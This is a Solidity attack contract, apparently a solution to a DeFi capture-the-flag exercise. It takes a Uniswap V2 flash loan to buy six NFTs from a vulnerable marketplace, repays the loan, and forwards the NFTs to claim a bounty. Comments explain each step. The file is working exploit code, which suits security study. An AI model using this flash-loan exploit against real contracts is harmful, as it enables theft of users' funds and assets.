// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker {
    uint private constant FLASH_LOAN_AMOUNT = 15 ether;

    uint256[] private tokenIds = [0,1,2,3,4,5];

    IUniswapV2Pair private immutable  uinswapV2Pair;
    IWETH private immutable  weth;
    IFreeRiderNFTMarketplace private immutable  freeRiderNFTMarketplace;
    IERC721 private immutable  nft;
    address private immutable  devsContract;
    address private immutable  player;

    constructor(address _uinswapV2Pair, address _weth, address _freeRiderNFTMarketplace, address _nft, address _devsContract, address _player) payable {
        uinswapV2Pair = IUniswapV2Pair(_uinswapV2Pair);
        weth = IWETH(_weth);
        freeRiderNFTMarketplace = IFreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
        nft =IERC721(_nft);         
        devsContract = _devsContract;
        player = _player; 
    }
    
    function attack() public {
        //use the swap method on the uniswpPair to get a flash loan => we need to provide some bytes data (content irrelevant for us)
        //in order for the swap method to call "uniswapV2Call" on our contract
        bytes memory data = abi.encode("does not matter");
        uinswapV2Pair.swap(FLASH_LOAN_AMOUNT, 0, address(this), data);
       
        //transfer all NFT's => data = target address where the bounty should be sent
        data = abi.encode(player);
        for(uint i=0; i<6;) {
            nft.safeTransferFrom(address(this), devsContract, i, data);  
            ++i;
        }  
    }

    //callback from uniswapPair.swap => we need to pay back the loan  with a 0.3% fee at the end of thhis method
    function uniswapV2Call(address /*sender*/,  uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
        //not really required, but we can do some basic validation => 
        //make sure, the this method is called from the uinswapV2Pair and that we are the initiator of the call
        require(msg.sender == address(uinswapV2Pair));
        require(tx.origin == player);
        
        //when this method gets called by the uinswapV2Pair, we should have gotten our WETH FL =>
        //however, we need ETH, so, we need to call withdraw on our weth instance
        weth.withdraw(FLASH_LOAN_AMOUNT);
        
        //we use that ETH to buy all NFT's from the marketplace
        freeRiderNFTMarketplace.buyMany{value: FLASH_LOAN_AMOUNT}(tokenIds);

        //and finally, we pay back the FL + 0.3% fee =>
        //we need to transfer weth back to the uinswapV2Pair =>
        //to do so, we first have to convert our ETH to WETH by calling deposit on our weth instance
        //after converting ETH to WETH, we can transfer the WETH to the uinswapV2Pair
        uint256 loanPlusFees = (FLASH_LOAN_AMOUNT * 1004) / 1000;
        weth.deposit{value: loanPlusFees}();
        weth.transfer(address(uinswapV2Pair), loanPlusFees);
    }

    //the FreeRiderNFTMarketplace will send NFT's using safeTransferFRom => calls onERC721Received if the target is a contract 
    function onERC721Received(address /*operator*/, address /*from*/, uint256 /*tokenId*/, bytes calldata /*data*/) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    //we need to be able to receive ETH when we call weth.withdraw()
    receive() external payable {}    
}
